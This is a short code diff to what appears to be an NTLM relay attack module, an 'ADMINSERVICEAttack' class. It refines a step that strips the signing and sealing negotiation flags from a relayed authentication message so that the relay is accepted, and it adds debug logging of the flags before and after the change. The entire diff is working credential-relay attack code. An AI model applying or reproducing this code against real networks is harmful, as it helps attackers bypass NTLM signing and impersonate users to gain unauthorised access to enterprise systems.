@@ -41,15 +41,21 @@ class ADMINSERVICEAttack:
             LOG.debug('Applying remove_mic_partial processing to AdminService token')
             authMessage = NTLMAuthChallengeResponse()
             authMessage.fromString(token)
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+            original_flags = authMessage['flags']
+            LOG.debug(f'Original NTLM flags: 0x{original_flags:08x}')
+
+            # Remove SIGN, ALWAYS_SIGN, and SEAL flags
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
                 LOG.debug('Removed NTLMSSP_NEGOTIATE_SIGN flag')
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
                 LOG.debug('Removed NTLMSSP_NEGOTIATE_ALWAYS_SIGN flag')
-            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == NTLMSSP_NEGOTIATE_SEAL:
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SEAL
                 LOG.debug('Removed NTLMSSP_NEGOTIATE_SEAL flag')
+
+            LOG.debug(f'Modified NTLM flags: 0x{authMessage["flags"]:08x}')
             # Do NOT remove KEY_EXCH or VERSION flags
             # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
             token = authMessage.getData()
